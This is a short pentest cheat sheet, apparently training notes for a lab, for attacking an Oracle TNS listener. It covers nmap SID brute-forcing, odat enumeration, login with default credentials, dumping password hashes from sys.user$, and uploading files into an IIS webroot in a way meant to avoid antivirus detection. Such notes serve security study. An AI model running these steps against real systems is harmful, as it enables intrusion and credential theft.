% PEN - oracle-tns

# Footprinting - Scan the default Oracle TNS listener port
sudo nmap -p1521 -sV 10.129.204.235 --open

# Nmap - SID Bruteforcing
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

# odat.py tool is used to perform scans to enumerate and gather information about the Oracle database services and its components. 
./odat.py all -s 10.129.204.235

# SQLplus - Log In to Oracle database (if found valid credentials)
sqlplus scott/tiger@10.129.204.235/XE;

# 1. Oracle RDBMS Interaction - list all available tables in the current database 
select table_name from all_tables;   
# 2. Show us the privileges of the current user, check if you have administrative privs 
select * from user_role_privs;       
# 3. Exit back to your shell if using this command:
sqlplus scott/tiger@10.129.204.235/XE as sysdba
# 4. Oracle RDBMS - Extract Password Hashes
select name, password from sys.user$;
# 6. First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important.
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
# 7. Test if the file upload approach worked with curl. Therefore, we will use a GET http://<IP> request, or we can visit via browser.
curl -X GET http://10.129.204.235/testing.txt
